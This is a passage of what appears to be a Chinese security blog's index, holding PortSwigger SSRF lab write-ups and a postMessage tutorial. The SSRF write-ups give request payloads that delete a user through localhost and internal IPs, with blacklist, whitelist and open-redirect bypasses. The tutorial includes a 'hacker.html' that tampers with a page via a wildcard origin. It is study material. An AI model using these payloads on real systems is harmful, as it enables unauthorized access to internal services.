      <url>/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="Basic-SSRF-against-the-local-server"><a href="#Basic-SSRF-against-the-local-server" class="headerlink" title="Basic SSRF against the local server"></a>Basic SSRF against the local server</h1><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><ul><li>抓到存在url的包，尝试ssrf</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021549509.png" alt="image-20240202154937413" style="zoom:50%;" /><ul><li>替换url</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021550518.png" alt="image-20240202155025432" style="zoom:50%;" /><ul><li>拼接合适的删除url<code>stockApi=http://localhost/admin/delete?username=carlos</code>,解决</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021551100.png" alt="image-20240202155139030"></p><h1 id="Basic-SSRF-against-another-back-end-system（针对另一个后端系统的基本SSRF）"><a href="#Basic-SSRF-against-another-back-end-system（针对另一个后端系统的基本SSRF）" class="headerlink" title="Basic SSRF against another back-end system（针对另一个后端系统的基本SSRF）"></a>Basic <a href="https://portswigger.net/web-security/ssrf">SSRF</a> against another back-end system（针对另一个后端系统的基本SSRF）</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ul><li>抓包看到有一个内网地址，192.168.0.1</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021607697.png"></p><ul><li>在后面拼接admin返回错误</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021608978.png" alt="image-20240202160815904"></p><ul><li>遍历198.168.0.1-255找到另外一个内网地址</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021613760.png" alt="image-20240202161344681"></p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021614733.png" alt="image-20240202161400650"></p><ul><li>找到内网地址加入参数<code>stockApi=http://192.168.0.89:8080/admin/delete?username=carlos</code></li></ul><h1 id="SSRF-with-blacklist-based-input-filter-具有基于黑名单的输入过滤器的SSRF"><a href="#SSRF-with-blacklist-based-input-filter-具有基于黑名单的输入过滤器的SSRF" class="headerlink" title="SSRF with blacklist-based input filter(具有基于黑名单的输入过滤器的SSRF)"></a>SSRF with blacklist-based input filter(具有基于黑名单的输入过滤器的SSRF)</h1><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>使用<code>127.0.0.1</code>的替代IP表示，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>（十进制，八进制表示）</li><li>注册您自己的域名，解析为<code>127.0.0.1</code></li><li>使用URL编码或大小写变化混淆被阻止的字符串</li><li>提供您控制的URL，该URL重定向到目标URL。尝试使用不同的重定向代码，以及目标URL的不同协议。例如，在重定向期间从<code>http:</code>切换到<code>https:</code> URL已经被证明可以绕过一些反SSRF过滤器。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li><p>抓包用url双编码绕过<code>stockApi=http://127.1/%2561dmin</code>把字母a两次url编码</p></li><li><p>删除的url<code>stockApi=http://127.1/%2561dmin/delete?username=carlos</code></p></li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021642896.png" alt="image-20240202164202819" style="zoom:50%;" /><h1 id="SSRF-with-whitelist-based-input-filter（具有基于白名单的输入过滤器的SSRF）"><a href="#SSRF-with-whitelist-based-input-filter（具有基于白名单的输入过滤器的SSRF）" class="headerlink" title="SSRF with whitelist-based input filter（具有基于白名单的输入过滤器的SSRF）"></a>SSRF with whitelist-based input filter（具有基于白名单的输入过滤器的SSRF）</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li><p>您可以使用<code>#</code>字符来表示URL片段。举例来说：<code>https://evil-host#expected-host</code></p></li><li><p>您可以使用<code>@</code>字符在URL中的主机名之前嵌入凭据。举例来说：<code>https://expected-host:fakepassword@evil-host</code></p></li><li><p>您可以利用DNS命名层次结构将所需的输入放入您控制的完全限定的DNS名称中。举例来说：<code>https://expected-host.evil-host</code></p></li><li><p>多种绕过方式结合：<code>https://evil-host%2523@expected-host</code>（其中的%2523是表示#，就是evil-host#@expected-host）</p></li></ul><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ul><li><p>抓包试试@能不能绕过</p></li><li><p>原本是<code>http://stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</code>插入@字符<code>http://11212@stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1</code>发现@可用,就是url支持嵌入式凭据</p></li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021719044.png" alt="image-20240202171923992" style="zoom:50%;" /><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021705606.png" style="zoom:50%;" /><ul><li>再尝试#,发现报错,进行双编码绕过,再尝试前面嵌入127.1<code>stockApi=http://127.1%25%32%33@stock.weliketoshop.net/admin</code></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021722032.png" alt="image-20240202172224949"></p><h1 id="SSRF-with-filter-bypass-via-open-redirection-vulnerability-SSRF通过开放重定向漏洞实现过滤器旁路"><a href="#SSRF-with-filter-bypass-via-open-redirection-vulnerability-SSRF通过开放重定向漏洞实现过滤器旁路" class="headerlink" title="SSRF with filter bypass via open redirection vulnerability(SSRF通过开放重定向漏洞实现过滤器旁路)"></a>SSRF with filter bypass via open redirection vulnerability(SSRF通过开放重定向漏洞实现过滤器旁路)</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>在前面的例子中，假设用户提交的URL经过严格验证，以防止SSRF行为的恶意利用。但是，允许其URL的应用程序包含一个开放的重定向漏洞。如果用于生成后端HTTP请求的API支持重定向，则可以构造一个满足过滤器的URL，并将请求重定向到所需的后端目标.也就是说利用重定向访问从而实现ssrf</li><li>例子<code>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code>这个会跳转到访问<code>http://192.168.0.68/admin</code></li><li>这个SSRF漏洞是有效的，因为应用程序首先验证提供的<code>stockAPI</code> URL是否在允许的域中，它确实是。然后，应用程序请求提供的URL，这将触发开放重定向。它遵循重定向，并向攻击者选择的内部URL发出请求。</li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><ul><li>抓包找到一个有重定向的请求包</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021731275.png"></p><ul><li><p>观察这个请求包,我们看到存在一个<code>/product/nextProduct</code>接口,我们把<code>path</code>的地址换成<code>http://192.168.0.12:8080/admin</code>发现是无法访问的,但是我们可将两个点结合</p></li><li><p>先测试一下这个接口是否有重定向的漏洞,看到dnslog带出了</p></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021742642.png"></p><ul><li>接着我们在访问价格的请求包中的<code>stockApi</code>拼接这个接口并且访问内网地址<code>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin</code></li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021743155.png" alt="22"></p><ul><li>访问<code>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</code>删除用户</li></ul><h1 id="Blind-SSRF-with-out-of-band-detection-具有带外检测的盲SSRF"><a href="#Blind-SSRF-with-out-of-band-detection-具有带外检测的盲SSRF" class="headerlink" title="Blind SSRF with out-of-band detection(具有带外检测的盲SSRF)"></a>Blind SSRF with out-of-band detection(具有带外检测的盲SSRF)</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul><li>使用带外技术最简单、最有效的方法是使用<a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>。您可以使用<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a>来生成唯一的域名，将其作为有效负载发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入HTTP请求，则它易受SSRF攻击。</li></ul><h2 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h2><ul><li>抓包更改请求头referer参数</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021751446.png"></p><ul><li>带出http访问</li></ul><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202402021756146.png" alt="image-20240202175657090"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场-portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> portswigger </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Postmessage学习</title>
      <link href="/2024/01/30/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/Postmessage%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/30/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/Postmessage%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">Postmessage学习 </h1><h1 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><blockquote><p><code>postMessage</code> 是一个用于在不同窗口或文档之间进行安全跨域通信的 Web API 方法。它允许一个窗口或 iframe 向另一个窗口或 iframe 发送消息，即使这些窗口或 iframe 不在同一个域中也可以安全使用。这是为了避免跨域限制而设计的一种机制。</p></blockquote><ul><li>基本语法如下：<br><code>otherWindow.postMessage(message, targetOrigin, [transfer]);</code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">otherWindow: 目标窗口的引用，可以是另一个窗口、iframe 或者其他支持 postMessage 的对象。</span><br><span class="line">message: 要发送的消息数据，可以是字符串、数字、对象等。</span><br><span class="line">targetOrigin: 表示目标窗口的源（origin），这是一个字符串。如果你知道目标窗口的源，可以提供它，以增加安全性。可以是具体的源（例如，&quot;https://example.com&quot;），或者通配符 &quot;*&quot; 表示允许来自任意源的消息。</span><br><span class="line">transfer (可选): 一个可选的数组，包含要在消息中传递的 Transferable 对象，如 ArrayBuffer。</span><br><span class="line"></span><br><span class="line">在发送端，你可以使用 postMessage 将消息发送到目标窗口：</span><br><span class="line">const targetWindow = document.getElementById(&quot;target&quot;).contentWindow;</span><br><span class="line">targetWindow.postMessage(&quot;Hello, this is a message!&quot;, &quot;https://example.com&quot;);</span><br><span class="line"></span><br><span class="line">在接收端，你可以通过在 window 上监听 &quot;message&quot; 事件来捕获发送的消息：</span><br><span class="line">window.addEventListener(&quot;message&quot;, (event) =&gt; &#123;</span><br><span class="line">  // 处理接收到的消息</span><br><span class="line">  const receivedMessage = event.data;</span><br><span class="line">  console.log(receivedMessage);</span><br><span class="line">&#125;, false);</span><br><span class="line">这种机制通常用于在同一域之间的不同窗口或 iframe 之间进行通信，例如在父窗口和嵌套的 iframe 之间。</span><br></pre></td></tr></table></figure></li></ul><h2 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h2><ul><li>demo1.html</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function openChild() &#123;</span><br><span class="line">    child = window.open(&#x27;demo2.html&#x27;, &#x27;popup&#x27;, &#x27;height=300px, width=500px&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function sendMessage()&#123;</span><br><span class="line">    //发送的数据内容</span><br><span class="line">    let msg=&#123;pName : &quot;jack&quot;, pAge: &quot;12&quot;&#125;;</span><br><span class="line">    //发送消息数据数据到任意目标源, *指的是任意anyone</span><br><span class="line">    child.postMessage(msg,&#x27;*&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;input type=&#x27;button&#x27; id=&#x27;btnopen&#x27; value=&#x27;Open child&#x27; onclick=&#x27;openChild();&#x27; /&gt;</span><br><span class="line">            &lt;input type=&#x27;button&#x27; id=&#x27;btnSendMsg&#x27; value=&#x27;Send Message&#x27; onclick=&#x27;sendMessage();&#x27; /&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>demo2.html</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        //添加事件监控消息</span><br><span class="line">    window.addEventListener(&quot;message&quot;, (event)=&gt;&#123;</span><br><span class="line">        let txt=document.getElementById(&quot;msg&quot;);</span><br><span class="line">        //接收传输过来的变量数据</span><br><span class="line">        txt.value=`Name is $&#123;event.data.pName&#125; Age is  $&#123;event.data.pAge&#125;` ;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;h1&gt;postMessage学习&lt;/h1&gt;</span><br><span class="line">        &lt;input type=&#x27;text&#x27; id=&#x27;msg&#x27;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>效果</li></ul><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401301354143.png" style="zoom:50%;" /><h1 id="危害演示"><a href="#危害演示" class="headerlink" title="危害演示"></a>危害演示</h1><ul><li>我们从本地创建直接访问hacker.html代码就可以串改deom2网页的内容</li><li>这里要使用setimeout函数，因为这样我猜是window.open 方法通常是异步的，它会在后台加载新文档，而不会等待文档完全加载。因此，使用 setTimeout 会等待一段时间，以确保新文档已经准备好接收消息。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line"> &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">childwin = window.open(&#x27;http://119.45.227.86/postmessage/demo2.html&#x27;);</span><br><span class="line"></span><br><span class="line">function sendMessage()&#123;</span><br><span class="line">    let msg=&#123;pName : &quot;attacker&quot;, pAge: &quot;16&quot;&#125;;</span><br><span class="line">    childwin.postMessage(msg,&#x27;*&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(function()&#123;setTimeout(&quot;sendMessage()&quot;,1000);&#125;()); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401301410735.png" alt="image-20240130141053689"></p><ul><li>对于存在跳转漏洞即是herf跳转的，具体可以查看DOM-XSS靶场中的漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习日志 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2024/01/05/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/%E6%BC%94%E7%A4%BA/"/>
      <url>/2024/01/05/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<pre><code class="javascript">    funtion a()&#123;        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        vconsole.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)        console.log(&quot;hello&quot;)    &#125;</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
